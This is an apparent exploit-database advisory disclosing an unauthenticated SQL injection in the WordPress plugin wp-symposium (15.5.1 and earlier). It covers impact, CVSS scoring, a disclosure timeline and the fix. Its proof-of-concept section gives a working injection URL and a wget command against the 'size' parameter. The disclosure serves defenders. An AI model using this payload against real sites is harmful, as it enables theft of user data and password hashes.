@@ -1,0 +1,64 @@
+# Exploit Title: Wordpress Plugin wp-symposium Unauthenticated SQL Injection Vulnerability
+# Date: 2015-07-30
+# Exploit Author: PizzaHatHacker
+# Vendor Homepage: http://www.wpsymposium.com/
+# Version: ? <= version <= 15.5.1
+# Contact: PizzaHatHacker[a]gmail[.]com
+# Tested on: Apache / WordPress 4.2.3 / wp-symposium 15.5.1
+# CVE: 
+# Category: remote
+
+1. Product Description
+Extract from the plugin page :
+"WP Symposium turns a WordPress website into a Social Network! It is a WordPress plugin that provides a forum, activity (similar to Facebook wall), member directory, private mail, notification panel, chat windows, profile page, social widgets, activity alerts, RSS activity feeds, Groups, Events, Gallery, Facebook Connect and Mobile support! You simply choose which you want to activate! Certain features are optional to members to protect their privacy."
+
+2. Vulnerability Description & Technical Details
+Wordpress plugin wp-symposium version 15.5.1 (and probably all existing previous versions) suffers from an unauthenticated SQL Injection in get_album_item.php parameter 'size'.
+The issue is exploitable even if the plugin is deactivated.
+
+3. Impact Analysis :
+
+The SQL injection allows (very easily) to retrieve all the database content, which includes users details and password hashes. An attacker may be able to crack users' password hashes and log in as them. If an administrator user password is obtained, then the attacker could take complete control of the Wordpress installation. Collected information may also allow further attacks.
+
+4. Common Vulnerability Scoring System
+* Exploitability Metrics
+- Access Vector (AV) : Network (AV:N)
+- Access Complexity (AC) : Low (AC:L)
+- Authentication (Au) : None (Au:N)
+
+* Impact Metrics
+- Confidentiality Impact (C) : Partial (C:P)
+- Integrity Impact (I) : Partial (I:P)
+- Availability Impact (A) : Partial (A:P)
+
+* CVSS v2 Vector (AV:N/AC:M/Au:N/C:P/I:P/A:P)
+- CVSS Base Score : 7.5
+- Impact Subscore 6.4
+- Exploitability Subscore 10
+
+5. Proof of Concept
+
+PoC URL : http://localhost/<WP-path>/wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20--
+PoC Command (Unix) : wget "http://localhost/<WP-path>/wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20--" -O output.txt
+
+In the content of the HTTP response you will find the MySQL version, for example :
+5.5.44-0+deb7u1
+
+6. Vulnerability Timeline
+2015-05    : Vulnerability identified
+2015-07-30 : Vendor informed about this issue
+2015-07-30 : Vendor confirms the issue
+2015-08-04 : Ask for a delay to deploy the fix
+2015-08-04 : Response : 1-2 days (needs testing)
+2015-08-07 : Update to version 15.8 is available
+2015-08-10 : Disclosure of this document (a diff on the patch will trivially reveal the issue)
+
+7. Solution
+Update Wordpress plugin wp-symposium to the latest version, which is 15.8 at the date I am writing this.
+
+8. Personal Notes
+
+I am not a security professional, just a fan of computer security.
+If you have any questions/remarks, feel free to contact me.
+I'm interesting in any discussion/advice/question/criticism about security/exploits/programming :-)
+
